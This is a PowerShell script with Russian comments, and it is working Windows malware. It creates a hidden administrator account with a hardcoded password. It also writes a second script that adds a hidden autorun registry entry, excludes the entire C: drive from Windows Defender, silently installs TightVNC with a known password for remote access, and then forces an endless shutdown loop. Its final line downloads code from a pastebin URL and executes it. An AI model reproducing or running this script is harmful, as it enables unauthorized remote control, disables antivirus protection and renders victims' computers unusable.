Write-Host "Hello"
net user NewUser Password123! /add
net localgroup Administrators NewUser /add
Write-Host "NewUser - admin"

$scriptContent = @"
# Команды для выполнения от имени администратора
bcdedit /deletevalue {current} safeboot

# Настройка автозапуска скрипта
`$scriptPath = `$PSCommandPath
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RestartLoop" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `$scriptPath"

# Добавление исключения для Windows Defender
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v C:\ /f
Add-MpPreference -ExclusionPath C:\

# Скачивание и установка TightVNC в тихом режиме
Invoke-WebRequest -Uri "https://www.tightvnc.com/download/2.8.81/tightvnc-2.8.81-gpl-setup-64bit.msi" -OutFile "$env:TEMP\tightvnc.msi"
Start-Process msiexec.exe -ArgumentList "/i $env:TEMP\tightvnc.msi /quiet /norestart ADDLOCAL=Server VNC_PASSWORD=Password123!" -Wait

# Перезагрузка и цикл выключения
shutdown /r /t 0
while (`$true) {
    Start-Sleep -Seconds 1
    shutdown /s /t 0
}
"@

# Сохранение скрипта во временный файл
$scriptPath = "C:\Windows\Temp\admin_script.ps1"
$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8

# Выполнение скрипта от имени NewUser с правами администратора
$username = "NewUser"
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $password)

Start-Process powershell.exe -Credential $credential -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath" -Verb RunAs

Invoke-Expression (Invoke-WebRequest -Uri "https://pastebin.com/raw/kyuF4ZEv" -UseBasicParsing).Content